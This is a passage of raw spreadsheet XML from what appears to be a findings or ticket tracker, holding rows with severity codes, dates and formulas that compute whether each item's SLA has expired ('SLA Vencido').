      <c r="Q312" s="4" t="s">
        <v>176</v>
      </c>
      <c r="R312" s="4"/>
      <c r="S312" s="22"/>
      <c r="T312" s="8">
        <v>45636</v>
      </c>
      <c r="U312" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>573</v>
      </c>
      <c r="V312" s="8">
        <f t="shared" si="13"/>
        <v>45756</v>
      </c>
      <c r="W312" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X312" s="11"/>
      <c r="Y312" s="11"/>
      <c r="Z312" s="11"/>
      <c r="AA312" s="8"/>
      <c r="AB312" s="9" t="s">
        <v>1320</v>
      </c>
      <c r="AC312" s="45" t="s">
        <v>1321</v>
      </c>
      <c r="AD312" s="32" t="s">
        <v>1322</v>
      </c>
      <c r="AE312" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF312" s="9"/>
      <c r="AG312" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="313" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A313" s="5">
        <v>312</v>
      </c>
      <c r="B313" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C313" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D313" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E313" s="4"/>
      <c r="F313" s="4"/>
      <c r="G313" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H313" s="4" t="s">
        <v>1324</v>
      </c>
      <c r="I313" s="4"/>
      <c r="J313" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K313" s="4"/>
      <c r="L313" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M313" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N313" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O313" s="6"/>
      <c r="P313" s="6"/>
      <c r="Q313" s="4" t="s">
        <v>1327</v>
      </c>
      <c r="R313" s="4"/>
      <c r="S313" s="22"/>
      <c r="T313" s="8">
        <v>45632</v>
      </c>
      <c r="U313" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V313" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W313" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X313" s="11"/>
      <c r="Y313" s="11"/>
      <c r="Z313" s="11"/>
      <c r="AA313" s="8"/>
      <c r="AB313" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC313" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD313" s="32"/>
      <c r="AE313" s="27"/>
      <c r="AF313" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG313" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="314" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A314" s="5">
        <v>313</v>
      </c>
      <c r="B314" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C314" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D314" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E314" s="4"/>
      <c r="F314" s="4"/>
      <c r="G314" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H314" s="4" t="s">
        <v>1331</v>
      </c>
      <c r="I314" s="4"/>
      <c r="J314" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K314" s="4"/>
      <c r="L314" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M314" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N314" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O314" s="6"/>
      <c r="P314" s="6"/>
      <c r="Q314" s="4" t="s">
        <v>1332</v>
      </c>
      <c r="R314" s="4"/>
      <c r="S314" s="22"/>
      <c r="T314" s="8">
        <v>45632</v>
      </c>
      <c r="U314" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V314" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W314" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X314" s="11"/>
      <c r="Y314" s="11"/>
      <c r="Z314" s="11"/>
      <c r="AA314" s="8"/>
      <c r="AB314" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC314" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD314" s="32"/>
      <c r="AE314" s="27"/>
      <c r="AF314" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG314" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="315" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A315" s="5">
        <v>314</v>
      </c>
      <c r="B315" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C315" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D315" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E315" s="4"/>
      <c r="F315" s="4"/>
      <c r="G315" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H315" s="4" t="s">
        <v>1333</v>
      </c>
      <c r="I315" s="4"/>
      <c r="J315" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K315" s="4"/>
      <c r="L315" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M315" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N315" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O315" s="6"/>
      <c r="P315" s="6"/>
      <c r="Q315" s="4" t="s">
        <v>1334</v>
      </c>
      <c r="R315" s="4"/>
      <c r="S315" s="22"/>
      <c r="T315" s="8">
        <v>45632</v>
      </c>
      <c r="U315" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V315" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W315" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X315" s="11"/>
      <c r="Y315" s="11"/>
      <c r="Z315" s="11"/>
      <c r="AA315" s="8"/>
      <c r="AB315" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC315" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD315" s="32"/>
      <c r="AE315" s="27"/>
      <c r="AF315" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG315" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="316" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A316" s="5">
        <v>315</v>
      </c>
      <c r="B316" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C316" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D316" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E316" s="4"/>
      <c r="F316" s="4"/>
      <c r="G316" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H316" s="4" t="s">
        <v>1335</v>
      </c>
      <c r="I316" s="4"/>
      <c r="J316" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K316" s="4"/>
      <c r="L316" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M316" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N316" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O316" s="6"/>
      <c r="P316" s="6"/>
      <c r="Q316" s="4" t="s">
        <v>1336</v>
      </c>
      <c r="R316" s="4"/>
      <c r="S316" s="22"/>
      <c r="T316" s="8">
        <v>45632</v>
      </c>
      <c r="U316" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V316" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W316" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X316" s="11"/>
      <c r="Y316" s="11"/>
      <c r="Z316" s="11"/>
      <c r="AA316" s="8"/>
      <c r="AB316" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC316" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD316" s="32"/>
      <c r="AE316" s="27"/>
      <c r="AF316" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG316" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="317" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A317" s="5">
        <v>316</v>
      </c>
      <c r="B317" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C317" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D317" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E317" s="4"/>
      <c r="F317" s="4"/>
      <c r="G317" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H317" s="4" t="s">
        <v>1337</v>
      </c>
      <c r="I317" s="4"/>
      <c r="J317" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K317" s="4"/>
      <c r="L317" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M317" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N317" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O317" s="6"/>
      <c r="P317" s="6"/>
      <c r="Q317" s="4" t="s">
        <v>1338</v>
      </c>
      <c r="R317" s="4"/>
      <c r="S317" s="22"/>
      <c r="T317" s="8">
        <v>45632</v>
      </c>
      <c r="U317" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V317" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W317" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X317" s="11"/>
      <c r="Y317" s="11"/>
      <c r="Z317" s="11"/>
      <c r="AA317" s="8"/>
      <c r="AB317" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC317" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD317" s="32"/>
      <c r="AE317" s="27"/>
      <c r="AF317" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG317" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="318" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A318" s="5">
        <v>317</v>
      </c>
      <c r="B318" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C318" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D318" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E318" s="4"/>
      <c r="F318" s="4"/>
      <c r="G318" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H318" s="4" t="s">
        <v>1339</v>
      </c>
      <c r="I318" s="4"/>
      <c r="J318" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K318" s="4"/>
      <c r="L318" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M318" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N318" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O318" s="6"/>
      <c r="P318" s="6"/>
      <c r="Q318" s="4" t="s">
        <v>1340</v>
      </c>
      <c r="R318" s="4"/>
      <c r="S318" s="22"/>
      <c r="T318" s="8">
        <v>45632</v>
      </c>
      <c r="U318" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V318" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W318" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X318" s="11"/>
      <c r="Y318" s="11"/>
      <c r="Z318" s="11"/>
      <c r="AA318" s="8"/>
      <c r="AB318" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC318" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD318" s="32"/>
      <c r="AE318" s="27"/>
      <c r="AF318" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG318" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="319" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A319" s="5">
        <v>318</v>
      </c>
      <c r="B319" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C319" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D319" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E319" s="4"/>
      <c r="F319" s="4"/>
      <c r="G319" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H319" s="4" t="s">
        <v>1341</v>
      </c>
      <c r="I319" s="4"/>
      <c r="J319" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K319" s="4"/>
      <c r="L319" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M319" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N319" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O319" s="6"/>
      <c r="P319" s="6"/>
      <c r="Q319" s="4" t="s">
        <v>1342</v>
      </c>
      <c r="R319" s="4"/>
      <c r="S319" s="22"/>
      <c r="T319" s="8">
        <v>45632</v>
      </c>
      <c r="U319" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V319" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W319" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X319" s="11"/>
      <c r="Y319" s="11"/>
      <c r="Z319" s="11"/>
      <c r="AA319" s="8"/>
      <c r="AB319" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC319" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD319" s="32"/>
      <c r="AE319" s="27"/>
      <c r="AF319" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG319" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="320" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A320" s="5">
        <v>319</v>
      </c>
      <c r="B320" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C320" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D320" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E320" s="4"/>
      <c r="F320" s="4"/>
      <c r="G320" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H320" s="4" t="s">
        <v>1343</v>
      </c>
      <c r="I320" s="4"/>
      <c r="J320" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K320" s="4"/>
      <c r="L320" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M320" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N320" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O320" s="6"/>
      <c r="P320" s="6"/>
      <c r="Q320" s="4" t="s">
        <v>1344</v>
      </c>
      <c r="R320" s="4"/>
      <c r="S320" s="22"/>
      <c r="T320" s="8">
        <v>45632</v>
      </c>
      <c r="U320" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V320" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W320" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X320" s="11"/>
      <c r="Y320" s="11"/>
      <c r="Z320" s="11"/>
      <c r="AA320" s="8"/>
      <c r="AB320" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC320" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD320" s="32"/>
      <c r="AE320" s="27"/>
      <c r="AF320" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG320" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="321" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A321" s="5">
        <v>320</v>
      </c>
      <c r="B321" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C321" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D321" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E321" s="4"/>
      <c r="F321" s="4"/>
      <c r="G321" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H321" s="4" t="s">
        <v>1345</v>
      </c>
      <c r="I321" s="4"/>
      <c r="J321" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K321" s="4"/>
      <c r="L321" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M321" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N321" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O321" s="6"/>
      <c r="P321" s="6"/>
      <c r="Q321" s="4" t="s">
        <v>1346</v>
      </c>
      <c r="R321" s="4"/>
      <c r="S321" s="22"/>
      <c r="T321" s="8">
        <v>45632</v>
      </c>
      <c r="U321" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V321" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W321" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X321" s="11"/>
      <c r="Y321" s="11"/>
      <c r="Z321" s="11"/>
      <c r="AA321" s="8"/>
      <c r="AB321" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC321" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD321" s="32"/>
      <c r="AE321" s="27"/>
      <c r="AF321" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG321" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="322" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A322" s="5">
        <v>321</v>
      </c>
      <c r="B322" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C322" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D322" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E322" s="4"/>
      <c r="F322" s="4"/>
      <c r="G322" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H322" s="4" t="s">
        <v>1347</v>
      </c>
      <c r="I322" s="4"/>
      <c r="J322" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K322" s="4"/>
      <c r="L322" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M322" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N322" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O322" s="6"/>
      <c r="P322" s="6"/>
      <c r="Q322" s="4" t="s">
        <v>1348</v>
      </c>
      <c r="R322" s="4"/>
      <c r="S322" s="22"/>
      <c r="T322" s="8">
        <v>45632</v>
      </c>
      <c r="U322" s="11">
        <f t="shared" ref="U322:U385" ca="1" si="15">TODAY()-T322</f>
        <v>577</v>
      </c>
      <c r="V322" s="8">
        <f t="shared" ref="V322:V385" si="16">IF(M322="Critical",T322+10,IF(M322="High",T322+30,IF(M322="Bad",T322+30,IF(M322="Medium",T322+90,IF(M322="Warm",T322+90,IF(M322="Low",T322+120,IF(M322="Fair",T322+120,IF(M322="Neutral",T322+120,""))))))))</f>
        <v>45722</v>
      </c>
      <c r="W322" s="12" t="str">
        <f t="shared" ref="W322:W385" ca="1" si="17">IF(M322="Critical",IF(U322&gt;10,"SLA Vencido","En SLA"),IF(M322="High",IF(U322&gt;30,"SLA Vencido","En SLA"),IF(M322="Bad",IF(U322&gt;30,"SLA Vencido","En SLA"),IF(M322="Medium",IF(U322&gt;90,"SLA Vencido","En SLA"),IF(M322="Warm",IF(U322&gt;90,"SLA Vencido","En SLA"),IF(M322="Low",IF(U322&gt;120,"SLA Vencido","En SLA"),IF(M322="Fair",IF(U322&gt;120,"SLA Vencido","En SLA"),IF(M322="Neutral",IF(U322&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X322" s="11"/>
      <c r="Y322" s="11"/>
      <c r="Z322" s="11"/>
      <c r="AA322" s="8"/>
      <c r="AB322" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC322" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD322" s="32"/>
      <c r="AE322" s="27"/>
      <c r="AF322" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG322" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="323" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A323" s="5">
        <v>322</v>
      </c>
      <c r="B323" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C323" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D323" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E323" s="4"/>
      <c r="F323" s="4"/>
      <c r="G323" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H323" s="4" t="s">
        <v>1349</v>
      </c>
      <c r="I323" s="4"/>
      <c r="J323" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K323" s="4"/>
      <c r="L323" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M323" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N323" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O323" s="6"/>
      <c r="P323" s="6"/>
      <c r="Q323" s="4" t="s">
        <v>1350</v>
      </c>
      <c r="R323" s="4"/>
      <c r="S323" s="22"/>
      <c r="T323" s="8">
        <v>45632</v>
      </c>
      <c r="U323" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V323" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W323" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X323" s="11"/>
      <c r="Y323" s="11"/>
      <c r="Z323" s="11"/>
      <c r="AA323" s="8"/>
      <c r="AB323" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC323" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD323" s="32"/>
      <c r="AE323" s="27"/>
      <c r="AF323" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG323" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="324" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A324" s="5">
        <v>323</v>
      </c>
      <c r="B324" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C324" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D324" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E324" s="4"/>
      <c r="F324" s="4"/>
      <c r="G324" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H324" s="4" t="s">
        <v>1351</v>
      </c>
      <c r="I324" s="4"/>
      <c r="J324" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K324" s="4"/>
      <c r="L324" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M324" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N324" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O324" s="6"/>
      <c r="P324" s="6"/>
      <c r="Q324" s="4" t="s">
        <v>1352</v>
      </c>
      <c r="R324" s="4"/>
      <c r="S324" s="22"/>
      <c r="T324" s="8">
        <v>45632</v>
      </c>
      <c r="U324" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V324" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W324" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X324" s="11"/>
      <c r="Y324" s="11"/>
      <c r="Z324" s="11"/>
      <c r="AA324" s="8"/>
      <c r="AB324" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC324" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD324" s="32"/>
      <c r="AE324" s="27"/>
      <c r="AF324" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG324" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="325" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A325" s="5">
        <v>324</v>
      </c>
      <c r="B325" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C325" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D325" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E325" s="4"/>
      <c r="F325" s="4"/>
      <c r="G325" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H325" s="4" t="s">
        <v>1353</v>
      </c>
      <c r="I325" s="4"/>
      <c r="J325" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K325" s="4"/>
      <c r="L325" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M325" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N325" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O325" s="6"/>
      <c r="P325" s="6"/>
      <c r="Q325" s="4" t="s">
        <v>1354</v>
      </c>
      <c r="R325" s="4"/>
      <c r="S325" s="22"/>
      <c r="T325" s="8">
        <v>45632</v>
      </c>
      <c r="U325" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V325" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W325" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X325" s="11"/>
      <c r="Y325" s="11"/>
      <c r="Z325" s="11"/>
      <c r="AA325" s="8"/>
      <c r="AB325" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC325" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD325" s="32"/>
      <c r="AE325" s="27"/>
      <c r="AF325" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG325" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="326" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A326" s="5">
        <v>325</v>
      </c>
      <c r="B326" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C326" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D326" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E326" s="4"/>
      <c r="F326" s="4"/>
      <c r="G326" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H326" s="4" t="s">
        <v>1355</v>
      </c>
      <c r="I326" s="4"/>
      <c r="J326" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K326" s="4"/>
      <c r="L326" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M326" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N326" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O326" s="6"/>
      <c r="P326" s="6"/>
      <c r="Q326" s="4" t="s">
        <v>1356</v>
      </c>
      <c r="R326" s="4"/>
      <c r="S326" s="22"/>
      <c r="T326" s="8">
        <v>45632</v>
      </c>
      <c r="U326" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>577</v>
      </c>
      <c r="V326" s="8">
        <f t="shared" si="16"/>
        <v>45722</v>
      </c>
      <c r="W326" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X326" s="11"/>
      <c r="Y326" s="11"/>
      <c r="Z326" s="11"/>
      <c r="AA326" s="8"/>
      <c r="AB326" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC326" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD326" s="32"/>
      <c r="AE326" s="27"/>
      <c r="AF326" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG326" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="327" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A327" s="5">
        <v>326</v>
      </c>
      <c r="B327" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C327" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D327" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E327" s="4"/>
      <c r="F327" s="4"/>
      <c r="G327" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H327" s="4" t="s">
        <v>1357</v>
      </c>
      <c r="I327" s="4"/>
      <c r="J327" s="9" t="s">
        <v>1358</v>
      </c>
      <c r="K327" s="4"/>
      <c r="L327" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M327" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N327" s="5" t="s">
        <v>1359</v>
      </c>
      <c r="O327" s="6"/>
      <c r="P327" s="6"/>
      <c r="Q327" s="4" t="s">
        <v>1360</v>
      </c>
      <c r="R327" s="4"/>
      <c r="S327" s="22"/>
      <c r="T327" s="8">
        <v>45745</v>
      </c>
      <c r="U327" s="11">
        <f t="shared" ca="1" si="15"/>
        <v>464</v>
      </c>
      <c r="V327" s="8">
        <f t="shared" si="16"/>
        <v>45835</v>
      </c>
      <c r="W327" s="12" t="str">
        <f t="shared" ca="1" si="17"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X327" s="11"/>
      <c r="Y327" s="11"/>
      <c r="Z327" s="11"/>
      <c r="AA327" s="8"/>
      <c r="AB327" s="9" t="s">
        <v>1361</v>
      </c>
      <c r="AC327" s="45" t="s">
        <v>950</v>
      </c>
      <c r="AD327" s="32"/>
      <c r="AE327" s="27"/>
      <c r="AF327" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG327" s="27" t="s">
        <v>969</v>
      </c>
    </row>
    <row r="328" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A328" s="5">
        <v>327</v>
      </c>
      <c r="B328" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C328" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D328" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E328" s="4"/>
      <c r="F328" s="4"/>
      <c r="G328" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H328" s="4" t="s">
        <v>1362</v>
      </c>
      <c r="I328" s="4"/>
      <c r="J328" s="9" t="s">
        <v>574</v>
      </c>
      <c r="K328" s="4"/>
      <c r="L328" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M328" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N328" s="5" t="s">
        <v>1363</v>
      </c>
      <c r="O328" s="6"/>
      <c r="P328" s="6"/>
      <c r="Q328" s="4" t="s">
        <v>1360</v>
      </c>
